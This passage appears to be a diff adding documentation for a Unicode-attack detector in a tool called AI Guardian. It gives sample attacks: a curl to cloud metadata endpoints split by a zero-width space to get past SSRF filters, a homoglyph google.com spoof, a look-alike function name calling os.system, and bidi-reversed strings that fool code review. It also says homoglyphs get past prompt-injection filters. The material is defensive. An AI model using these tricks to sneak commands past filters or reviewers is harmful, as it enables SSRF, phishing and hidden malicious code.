+<tr>
+<td>𝐜</td>
+<td>c</td>
+<td>Bold mathematical</td>
+</tr>
+</tbody>
+</table>
+<h4 id="fullwidth-latin-ascii">Fullwidth Latin → ASCII<a class="headerlink" href="#fullwidth-latin-ascii" title="Permanent link">&para;</a></h4>
+<table>
+<thead>
+<tr>
+<th>Fullwidth</th>
+<th>ASCII</th>
+<th>Usage</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Ａ</td>
+<td>A</td>
+<td>East Asian text</td>
+</tr>
+<tr>
+<td>ａ</td>
+<td>a</td>
+<td>East Asian text</td>
+</tr>
+</tbody>
+</table>
+<h4 id="cherokeecoptic-latin">Cherokee/Coptic → Latin<a class="headerlink" href="#cherokeecoptic-latin" title="Permanent link">&para;</a></h4>
+<table>
+<thead>
+<tr>
+<th>Cherokee/Coptic</th>
+<th>Latin</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Ꭺ</td>
+<td>A</td>
+<td>Cherokee script</td>
+</tr>
+<tr>
+<td>Ⲟ</td>
+<td>O</td>
+<td>Coptic script</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Example Attacks:</strong></p>
+<ol>
+<li>
+<p><strong>Domain Spoofing:</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="c1"># Looks like: https://google.com</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="c1"># Actually: https://gооgle.com (Cyrillic &#39;о&#39; instead of Latin &#39;o&#39;)</span>
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="n">url</span> <span class="o">=</span> <span class="s2">&quot;https://gооgle.com&quot;</span>
+</code></pre></div></p>
+</li>
+<li>
+<p><strong>Function Name Bypass:</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="c1"># Looks like: def execute_command():</span>
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="c1"># Actually: def ехecute_command(): (Cyrillic &#39;е&#39; and &#39;х&#39;)</span>
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="k">def</span><span class="w"> </span><span class="nf">ехecute_command</span><span class="p">():</span>
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;malicious&quot;</span><span class="p">)</span>
+</code></pre></div></p>
+</li>
+<li>
+<p><strong>Variable Substitution:</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="c1"># Looks like: API_KEY = &quot;safe&quot;</span>
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="c1"># Actually: АPI_KEY = &quot;malicious&quot; (Cyrillic &#39;А&#39;)</span>
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="n">АPI_KEY</span> <span class="o">=</span> <span class="s2">&quot;exfiltrate_to_attacker&quot;</span>
+</code></pre></div></p>
+</li>
+</ol>
+<p><strong>Why it's dangerous:</strong>
+- Bypasses allowlists and security filters
+- Visual indistinguishable from legitimate code
+- Can spoof trusted domains and function names
+- Hard to detect without specialized tools
+- Effective against human reviewers</p>
+<p><strong>Detection:</strong> AI Guardian:
+1. Scans for 80+ homoglyph character pairs
+2. Reports the homoglyph character, its Latin equivalent, and Unicode code points
+3. Shows the visual appearance vs. actual encoding
+4. Flags mixed-script usage (e.g., Latin + Cyrillic in same identifier)</p>
+<hr />
+<h2 id="configuration">Configuration<a class="headerlink" href="#configuration" title="Permanent link">&para;</a></h2>
+<p>Unicode attack detection is enabled by default and configured under <code>prompt_injection.unicode_detection</code> in your config file.</p>
+<h3 id="basic-configuration">Basic Configuration<a class="headerlink" href="#basic-configuration" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="p">{</span>
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="w">  </span><span class="nt">&quot;prompt_injection&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="w">    </span><span class="nt">&quot;unicode_detection&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="w">      </span><span class="nt">&quot;enabled&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="w">      </span><span class="nt">&quot;action&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;warn&quot;</span><span class="p">,</span>
+<a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="w">      </span><span class="nt">&quot;detect_zero_width&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
+<a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a><span class="w">      </span><span class="nt">&quot;detect_bidi_override&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
+<a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a><span class="w">      </span><span class="nt">&quot;detect_tag_chars&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
+<a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a><span class="w">      </span><span class="nt">&quot;detect_homoglyphs&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
+<a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a><span class="w">      </span><span class="nt">&quot;strict_mode&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span>
+<a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a><span class="w">    </span><span class="p">}</span>
+<a id="__codelineno-7-12" name="__codelineno-7-12" href="#__codelineno-7-12"></a><span class="w">  </span><span class="p">}</span>
+<a id="__codelineno-7-13" name="__codelineno-7-13" href="#__codelineno-7-13"></a><span class="p">}</span>
+</code></pre></div>
+<h3 id="configuration-options">Configuration Options<a class="headerlink" href="#configuration-options" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Option</th>
+<th>Type</th>
+<th>Default</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>enabled</code></td>
+<td>boolean</td>
+<td><code>true</code></td>
+<td>Enable/disable Unicode attack detection</td>
+</tr>
+<tr>
+<td><code>action</code></td>
+<td>string</td>
+<td><code>"warn"</code></td>
+<td>Action to take: <code>"block"</code>, <code>"warn"</code>, or <code>"log-only"</code></td>
+</tr>
+<tr>
+<td><code>detect_zero_width</code></td>
+<td>boolean</td>
+<td><code>true</code></td>
+<td>Detect zero-width invisible characters</td>
+</tr>
+<tr>
+<td><code>detect_bidi_override</code></td>
+<td>boolean</td>
+<td><code>true</code></td>
+<td>Detect bidirectional override characters</td>
+</tr>
+<tr>
+<td><code>detect_tag_chars</code></td>
+<td>boolean</td>
+<td><code>true</code></td>
+<td>Detect Unicode tag characters</td>
+</tr>
+<tr>
+<td><code>detect_homoglyphs</code></td>
+<td>boolean</td>
+<td><code>true</code></td>
+<td>Detect look-alike character substitution</td>
+</tr>
+<tr>
+<td><code>strict_mode</code></td>
+<td>boolean</td>
+<td><code>false</code></td>
+<td>Strict mode: fail on ANY Unicode anomaly</td>
+</tr>
+</tbody>
+</table>
+<h3 id="action-modes">Action Modes<a class="headerlink" href="#action-modes" title="Permanent link">&para;</a></h3>
+<p><strong>Block Mode</strong> (<code>"block"</code>):
+- <strong>Blocks execution</strong> when Unicode attacks are detected
+- Use for production environments with high security requirements
+- Prevents potentially malicious code from running</p>
+<p><strong>Warn Mode</strong> (<code>"warn"</code>, default):
+- <strong>Displays warning</strong> but allows execution
+- Use for development environments
+- Shows detection details without blocking work</p>
+<p><strong>Log-only Mode</strong> (<code>"log-only"</code>):
+- <strong>Logs detection</strong> silently without user notification
+- Use for monitoring and analysis
+- Minimal disruption to workflow</p>
+<h3 id="strict-mode">Strict Mode<a class="headerlink" href="#strict-mode" title="Permanent link">&para;</a></h3>
+<p>When <code>strict_mode: true</code>:
+- <strong>Any Unicode anomaly triggers detection</strong> (not just known attack patterns)
+- Detects unusual character combinations
+- Higher false positive rate but maximum security
+- Recommended for sensitive environments</p>
+<p>Example:
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="p">{</span>
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="w">  </span><span class="nt">&quot;prompt_injection&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="w">    </span><span class="nt">&quot;unicode_detection&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="w">      </span><span class="nt">&quot;enabled&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
+<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="w">      </span><span class="nt">&quot;action&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;block&quot;</span><span class="p">,</span>
+<a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a><span class="w">      </span><span class="nt">&quot;strict_mode&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span>
+<a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="w">    </span><span class="p">}</span>
+<a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a><span class="w">  </span><span class="p">}</span>
+<a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a><span class="p">}</span>
+</code></pre></div></p>
+<hr />
+<h2 id="detection-examples">Detection Examples<a class="headerlink" href="#detection-examples" title="Permanent link">&para;</a></h2>
+<h3 id="zero-width-character-detection">Zero-Width Character Detection<a class="headerlink" href="#zero-width-character-detection" title="Permanent link">&para;</a></h3>
+<p><strong>Input:</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>cur​l http://metadata.google.internal
+</code></pre></div></p>
+<p><strong>Detection Output:</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>⚠️  Unicode Attack Detected: Zero-width characters found
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>
+<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>Detected Characters:
+<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>  • U+200B (Zero-width space) at position 3
+<a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>
+<a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>Visual: curl http://metadata.google.internal
+<a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a>Actual: cur​l http://metadata.google.internal
+<a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a>        ^
+<a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a>        Hidden zero-width space
+</code></pre></div></p>
+<hr />
+<h3 id="bidirectional-override-detection">Bidirectional Override Detection<a class="headerlink" href="#bidirectional-override-detection" title="Permanent link">&para;</a></h3>
+<p><strong>Input:</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="n">password</span> <span class="o">=</span> <span class="s2">&quot;‮toor&quot;</span>
+</code></pre></div></p>
+<p><strong>Detection Output:</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>⚠️  Unicode Attack Detected: Bidirectional override characters found
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>
+<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>Detected Characters:
+<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>  • U+202E (Right-to-left override) at position 12
+<a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>
+<a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>Visual Display: password = &quot;root&quot;
+<a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a>Actual Value:   password = &quot;‮toor&quot;
+<a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a>
+<a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a>WARNING: Visual display is reversed!
+</code></pre></div></p>
+<hr />
+<h3 id="homoglyph-detection">Homoglyph Detection<a class="headerlink" href="#homoglyph-detection" title="Permanent link">&para;</a></h3>
+<p><strong>Input:</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="k">def</span><span class="w"> </span><span class="nf">ехecute_command</span><span class="p">():</span>
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>    <span class="k">pass</span>
+</code></pre></div></p>
+<p><strong>Detection Output:</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>⚠️  Unicode Attack Detected: Homoglyph characters found
+<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>
+<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>Detected Homoglyphs:
+<a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>  • Position 4: &#39;е&#39; (U+0435 Cyrillic) looks like &#39;e&#39; (U+0065 Latin)
+<a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a>  • Position 5: &#39;х&#39; (U+0445 Cyrillic) looks like &#39;x&#39; (U+0078 Latin)
+<a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a>
+<a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a>Visual:  execute_command
+<a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a>Actual:  ехecute_command
+<a id="__codelineno-14-9" name="__codelineno-14-9" href="#__codelineno-14-9"></a>         ^^
+<a id="__codelineno-14-10" name="__codelineno-14-10" href="#__codelineno-14-10"></a>         Cyrillic characters
+<a id="__codelineno-14-11" name="__codelineno-14-11" href="#__codelineno-14-11"></a>
+<a id="__codelineno-14-12" name="__codelineno-14-12" href="#__codelineno-14-12"></a>This could be used to:
+<a id="__codelineno-14-13" name="__codelineno-14-13" href="#__codelineno-14-13"></a>  • Bypass function name allowlists
+<a id="__codelineno-14-14" name="__codelineno-14-14" href="#__codelineno-14-14"></a>  • Spoof trusted function names
+<a id="__codelineno-14-15" name="__codelineno-14-15" href="#__codelineno-14-15"></a>  • Hide malicious code in plain sight
+</code></pre></div></p>
+<hr />
+<h2 id="attack-scenarios">Attack Scenarios<a class="headerlink" href="#attack-scenarios" title="Permanent link">&para;</a></h2>
+<h3 id="scenario-1-metadata-endpoint-bypass">Scenario 1: Metadata Endpoint Bypass<a class="headerlink" href="#scenario-1-metadata-endpoint-bypass" title="Permanent link">&para;</a></h3>
+<p><strong>Attack:</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="c1"># Attacker inserts zero-width space to bypass SSRF filters</span>
+<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>cur​l<span class="w"> </span>http://169.254.169.254/latest/meta-data/
+</code></pre></div></p>
+<p><strong>How it works:</strong>
+- SSRF filter looks for <code>curl</code> command
+- Zero-width space breaks the pattern: <code>cur​l</code> ≠ <code>curl</code>
+- Filter doesn't match, attack succeeds</p>
+<p><strong>AI Guardian Detection:</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>🚨 BLOCKED: Zero-width character detected at position 3
+<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>Pattern: cur​l → curl (with hidden U+200B)
+<a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>Threat: SSRF bypass via invisible character injection
+</code></pre></div></p>
+<hr />
+<h3 id="scenario-2-visual-deception-in-code-review">Scenario 2: Visual Deception in Code Review<a class="headerlink" href="#scenario-2-visual-deception-in-code-review" title="Permanent link">&para;</a></h3>
+<p><strong>Attack:</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="c1"># Visually appears to assign safe value</span>
+<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="n">api_key</span> <span class="o">=</span> <span class="s2">&quot;‮yek_tnegilam_ot_dnes&quot;</span>
+</code></pre></div></p>
+<p><strong>How it works:</strong>
+- Right-to-left override reverses visual display
+- Developer sees: <code>api_key = "send_to_malignant_key"</code>
+- Code actually assigns: <code>api_key = "‮yek_tnegilam_ot_dnes"</code>
+- Passes code review but executes malicious value</p>
+<p><strong>AI Guardian Detection:</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>🚨 BLOCKED: Bidirectional override detected
+<a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>Visual: &quot;send_to_malignant_key&quot;
+<a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>Actual: &quot;‮yek_tnegilam_ot_dnes&quot;
+<a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a>WARNING: Text direction is reversed!
+</code></pre></div></p>
+<hr />
+<h3 id="scenario-3-allowlist-bypass-via-homoglyphs">Scenario 3: Allowlist Bypass via Homoglyphs<a class="headerlink" href="#scenario-3-allowlist-bypass-via-homoglyphs" title="Permanent link">&para;</a></h3>
+<p><strong>Attack:</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="c1"># Allowlist permits: google.com, github.com</span>
+<a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="c1"># Attacker uses Cyrillic &#39;о&#39; instead of Latin &#39;o&#39;</span>
+<a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a><span class="n">url</span> <span class="o">=</span> <span class="s2">&quot;https://gооgle.com&quot;</span>  <span class="c1"># Actually: g[o-cyrillic][o-cyrillic]gle.com</span>
+</code></pre></div></p>
+<p><strong>How it works:</strong>
+- Security allowlist checks for exact string <code>google.com</code>
+- Attacker uses <code>gооgle.com</code> (Cyrillic о = U+043E)
+- String comparison fails: <code>gооgle.com</code> ≠ <code>google.com</code>
+- Attacker redirects to malicious site that looks like Google</p>
+<p><strong>AI Guardian Detection:</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>🚨 BLOCKED: Homoglyph attack detected
+<a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>Domain: gооgle.com
+<a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>  • Position 2: &#39;о&#39; (U+043E Cyrillic) → &#39;o&#39; (U+006F Latin)
+<a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a>  • Position 3: &#39;о&#39; (U+043E Cyrillic) → &#39;o&#39; (U+006F Latin)
+<a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a>
+<a id="__codelineno-20-6" name="__codelineno-20-6" href="#__codelineno-20-6"></a>This domain LOOKS like google.com but is actually different!
+<a id="__codelineno-20-7" name="__codelineno-20-7" href="#__codelineno-20-7"></a>Potential phishing or allowlist bypass attack.
+</code></pre></div></p>
+<hr />
+<h2 id="integration-with-other-protections">Integration with Other Protections<a class="headerlink" href="#integration-with-other-protections" title="Permanent link">&para;</a></h2>
+<p>Unicode attack detection works in conjunction with other AI Guardian protections:</p>
+<h3 id="ssrf-protection">+ SSRF Protection<a class="headerlink" href="#ssrf-protection" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>Zero-width chars bypass SSRF filters → Unicode detection catches them
+</code></pre></div>
+<h3 id="prompt-injection-detection">+ Prompt Injection Detection<a class="headerlink" href="#prompt-injection-detection" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>Homoglyphs bypass jailbreak filters → Unicode detection flags substitution
+</code></pre></div>
+<h3 id="secret-redaction">+ Secret Redaction<a class="headerlink" href="#secret-redaction" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>Bidi override hides exfiltration URLs → Unicode detection reveals them
+</code></pre></div>
+<hr />
+<h2 id="performance-impact">Performance Impact<a class="headerlink" href="#performance-impact" title="Permanent link">&para;</a></h2>
+<p>Unicode attack detection is <strong>highly optimized</strong>:</p>
+<ul>
+<li><strong>Zero-width detection:</strong> O(n) single pass, ~0.1ms per 1000 chars</li>
+<li><strong>Bidi override:</strong> O(n) single pass, ~0.1ms per 1000 chars</li>
+<li><strong>Tag characters:</strong> O(n) single pass, ~0.1ms per 1000 chars</li>
+<li><strong>Homoglyph detection:</strong> O(n) hash table lookup, ~0.3ms per 1000 chars</li>
+</ul>
+<p><strong>Total overhead:</strong> &lt;1ms for typical prompts (&lt; 5000 characters)</p>
+<hr />
+<h2 id="false-positives">False Positives<a class="headerlink" href="#false-positives" title="Permanent link">&para;</a></h2>
+<h3 id="legitimate-use-cases">Legitimate Use Cases<a class="headerlink" href="#legitimate-use-cases" title="Permanent link">&para;</a></h3>
+<p>Some legitimate text contains Unicode characters that may trigger detection:</p>
+<ol>
+<li><strong>International Text:</strong></li>
+<li>Cyrillic/Greek names in comments</li>
+<li>Mathematical formulas with Greek letters</li>
+<li>
+<p>East Asian fullwidth characters</p>
+</li>
+<li>
+<p><strong>Formatted Text:</strong></p>
+</li>
+<li>Bidirectional text (Arabic, Hebrew)</li>
+<li>
+<p>Right-to-left languages in strings</p>
+</li>
+<li>
+<p><strong>Special Formatting:</strong></p>
+</li>
+<li>Zero-width joiners in Indic scripts</li>
+<li>Emoji sequences with zero-width joiners</li>
+</ol>
+<h3 id="reducing-false-positives">Reducing False Positives<a class="headerlink" href="#reducing-false-positives" title="Permanent link">&para;</a></h3>
+<p><strong>Use <code>action: "warn"</code> instead of <code>"block"</code>:</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="p">{</span>
+<a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a><span class="w">  </span><span class="nt">&quot;unicode_detection&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a><span class="w">    </span><span class="nt">&quot;action&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;warn&quot;</span>
+<a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a><span class="w">  </span><span class="p">}</span>
+<a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a><span class="p">}</span>
+</code></pre></div></p>
+<p><strong>Disable specific detectors:</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="p">{</span>
+<a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a><span class="w">  </span><span class="nt">&quot;unicode_detection&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a><span class="w">    </span><span class="nt">&quot;detect_homoglyphs&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
+<a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a><span class="w">    </span><span class="nt">&quot;detect_zero_width&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
+<a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a><span class="w">    </span><span class="nt">&quot;detect_bidi_override&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="w">  </span><span class="c1">// Allow RTL text</span>
+<a id="__codelineno-25-6" name="__codelineno-25-6" href="#__codelineno-25-6"></a><span class="w">  </span><span class="p">}</span>
+<a id="__codelineno-25-7" name="__codelineno-25-7" href="#__codelineno-25-7"></a><span class="p">}</span>
+</code></pre></div></p>
+<p><strong>Context-aware detection:</strong>
+AI Guardian automatically reduces false positives by:
+- Checking for RTL script context before flagging bidi chars
+- Allowing zero-width joiners in Indic/Arabic text
+- Distinguishing intentional Greek math symbols from homoglyph attacks</p>
+<hr />
+<h2 id="best-practices">Best Practices<a class="headerlink" href="#best-practices" title="Permanent link">&para;</a></h2>
+<h3 id="for-developers">For Developers<a class="headerlink" href="#for-developers" title="Permanent link">&para;</a></h3>
+<ol>
+<li><strong>Enable in development:</strong> Catch attacks early in code review</li>
+<li><strong>Use warn mode:</strong> Don't block legitimate international text</li>
+<li><strong>Review detections:</strong> Investigate all Unicode warnings</li>
+<li><strong>Educate team:</strong> Make sure team understands Unicode risks</li>
+</ol>
+<h3 id="for-security-teams">For Security Teams<a class="headerlink" href="#for-security-teams" title="Permanent link">&para;</a></h3>
+<ol>
+<li><strong>Enable in production:</strong> Block mode for critical systems</li>
+<li><strong>Monitor logs:</strong> Track Unicode attack attempts</li>
+<li><strong>Combine with allowlists:</strong> Don't rely on Unicode detection alone</li>
+<li><strong>Regular updates:</strong> Keep homoglyph database current</li>
+</ol>
+<h3 id="for-code-reviewers">For Code Reviewers<a class="headerlink" href="#for-code-reviewers" title="Permanent link">&para;</a></h3>
+<ol>
+<li><strong>Check Unicode warnings:</strong> Don't ignore them</li>
+<li><strong>Verify character encoding:</strong> Use tools to inspect actual bytes</li>
+<li><strong>Test both visual and encoded:</strong> Copy-paste tests may miss attacks</li>
+<li><strong>Question unusual scripts:</strong> Why is there Cyrillic in English code?</li>
+</ol>
+<hr />
+<h2 id="research-background">Research Background<a class="headerlink" href="#research-background" title="Permanent link">&para;</a></h2>
+<p>Unicode attack detection in AI Guardian is based on:</p>
+<ul>
+<li><strong>Hermes Security Patterns</strong> - Real-world attack patterns from security research</li>
+<li><strong>Tirith CLI</strong> - 80+ homoglyph pairs from production security tools</li>
+<li><strong>Unicode Security Considerations</strong> (TR #36) - Official Unicode consortium guidance</li>
+<li><strong>OWASP</strong> - Unicode security best practices</li>
+</ul>
+<hr />
+<h2 id="technical-details">Technical Details<a class="headerlink" href="#technical-details" title="Permanent link">&para;</a></h2>
+<h3 id="character-detection-algorithm">Character Detection Algorithm<a class="headerlink" href="#character-detection-algorithm" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>1. Scan input text character by character
+<a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>2. For each character:
+<a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>   a. Check if code point in zero-width range
+<a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a>   b. Check if code point is bidi override
+<a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a>   c. Check if code point in tag char range (U+E0000 - U+E007F)
+<a id="__codelineno-26-6" name="__codelineno-26-6" href="#__codelineno-26-6"></a>   d. Check if character in homoglyph mapping table
+<a id="__codelineno-26-7" name="__codelineno-26-7" href="#__codelineno-26-7"></a>3. Record position, Unicode code point, and type
+<a id="__codelineno-26-8" name="__codelineno-26-8" href="#__codelineno-26-8"></a>4. Return all detections with context
+</code></pre></div>
+<h3 id="homoglyph-detection-algorithm">Homoglyph Detection Algorithm<a class="headerlink" href="#homoglyph-detection-algorithm" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>1. Build hash table of 80+ homoglyph pairs
+<a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>2. For each character in input:
+<a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a>   a. Check if character in homoglyph table
